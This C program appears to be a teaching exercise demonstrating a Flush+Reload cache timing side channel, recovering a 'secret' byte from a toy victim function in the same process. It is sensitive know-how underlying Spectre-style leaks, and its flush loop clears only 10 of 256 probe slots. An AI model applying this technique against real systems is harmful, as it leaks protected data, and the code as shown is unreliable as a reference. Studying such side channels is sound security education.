#include <emmintrin.h>
#include <x86intrin.h>
#include <stdio.h>
#include <stdint.h>
// Machine specific Parameter
// To be adjusted accordingly
#define CACHE_HIT_THRESHOLD (103)

//Offset to skip array[0]
#define OFFSET 1024

uint8_t array[265*4096];
int     temp;
char    secret = 94;


void flushSideChannel()
{
	for(int i=0; i<10; i++){
		_mm_clflush(&array[i*4096 + OFFSET]);
	} 
}

void victim()
{
	temp = array[secret*4096 + OFFSET];
}

void reloadSideChannel()
{
	int junk=0;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	for(int i=0;i<256;i++){
		addr = &array[i*4096 + OFFSET];
		time1= __rdtscp(&junk); junk= *addr;
		time2= __rdtscp(&junk) - time1;
		if(time2<=CACHE_HIT_THRESHOLD){
			printf("array[%d*4096 + %d] is in the cache\n", i, OFFSET);
			printf("The Secret = %d.\n",i);
		}
	}
}


int main(int argc, const char** argv)
{
	flushSideChannel();
	victim();
	reloadSideChannel();
	return (0);
}
